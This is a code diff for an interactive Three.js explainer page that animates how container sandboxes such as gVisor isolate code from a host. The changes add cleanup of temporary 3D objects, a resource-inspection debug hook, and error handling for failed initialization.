         [sheet, df, pivot].forEach(o => { o.scale.setScalar(0.001); o.visible = false; });
         sheet.position.y = sheetY;
@@ -1481,7 +1567,7 @@ defineScene('compare', {
       const key = matterBlock([-0.95, K, 0.85], 0.55, 0.45);
       s.add(key);
       s.add(tag(name, high ? [0.3, 3.2, -0.4] : [0, 0.2, 1.6], 'big'));
-      const temp = new THREE.Group(); s.add(temp);
+      const temp = temporaryGroup(); s.add(temp);
       g.add(s);
       return { s, k, key, temp };
     };
@@ -1524,11 +1610,11 @@ defineScene('compare', {
         await a.move(p, path[i], 450);
         if (hits[i]) await a.flash(hits[i][0], hits[i][1], 650);
       }
-      st.temp.remove(p);
+      disposeObject(p);
     };
     return {
       group: g,
-      reset() { actors.forEach((x, i) => x.position.copy(homes[i])); [C, M, W, O].forEach(st => st.temp.clear()); },
+      reset() { actors.forEach((x, i) => x.position.copy(homes[i])); [C, M, W, O].forEach(st => clearGroup(st.temp)); },
       async run(a, say) {
         say('네 곳의 코드가 똑같이 호스트의 키 파일을 노립니다. 먼저 컨테이너+gVisor.');
         await a.move(cA, toKey(cA), 500); await a.flash(cRoom, COLOR.bound, 600); await a.move(cA, homes[0], 350);
@@ -1571,6 +1657,7 @@ function resultFor(name) {
 function activate(name) {
   if (!scenes[name] || current === name) return;
   runToken++;
+  if (scenes[current]) clearTemporary(scenes[current].group);
   const s = scenes[name];
   for (const other of Object.values(scenes)) other.targetK = other === s ? 1 : 0;
   baseState.target = s.base ? 1 : 0;
@@ -1599,6 +1686,7 @@ async function runScene(name) {
   try {
     await s.run(a, say);
   } catch (e) {
+    if (mine === runToken) clearTemporary(s.group);
     if (e !== CANCEL) { console.error(e); say(uiStr('runError')); }
     return;
   }
@@ -1768,6 +1856,7 @@ function loop() {
 //   window.__explainer.overlaps()         → pairs of currently visible labels that overlap each other
 window.__explainer = {
   scenes: () => Object.keys(scenes),
+  resources: () => ({ labels: allTags.size, labelStates: labelState.size, geometries: renderer.info.memory.geometries }),
   lang: () => UI_LANG,                          // language used for screen text (en | ko | ja | zh-CN | override key)
   current: () => current,                       // name of the scene the stage is showing now
   autorun: v => { if (v !== undefined) setAutorun(v); return autorunOn; }, // Reads the auto-play state. If a value is given, changes it (and saves it) and returns the new state
@@ -1782,7 +1871,7 @@ window.__explainer = {
     return resultFor(name)?.textContent ?? '';
   },
   overlaps(minArea = 24) {
-    const boxes = allTags
+    const boxes = [...allTags]
       .filter(o => o.visible && o.element.isConnected && o.element.style.display !== 'none' && parseFloat(o.element.style.opacity || '1') > 0.5)
       .map(o => ({ text: o.element.textContent, r: o.element.getBoundingClientRect() }))
       .filter(b => b.r.width > 0);
@@ -1799,7 +1888,7 @@ window.__explainer = {
   },
   clipped() {
     const s = wrap.getBoundingClientRect(); // On phones the canvas cell (title bar and legend bar excluded) is the reference. On desktop it equals the stage.
-    return allTags
+    return [...allTags]
       .filter(o => o.visible && o.element.isConnected && o.element.style.display !== 'none' && parseFloat(o.element.style.opacity || '1') > 0.5)
       .map(o => ({ text: o.element.textContent, r: o.element.getBoundingClientRect() }))
       .filter(b => b.r.width > 0 && (b.r.left < s.left || b.r.right > s.right || b.r.top < s.top || b.r.bottom > s.bottom))
@@ -1812,6 +1901,12 @@ homeCamera(scenes[first]);
 resize();
 activate(first);
 loop();
+setStageState('ready');
+} catch (error) {
+  delete window.__explainer;
+  setStageState('failed', failureMessage);
+  console.error('[plz] 3D initialization failed:', error);
+}
 </script>
 </body>
 </html>
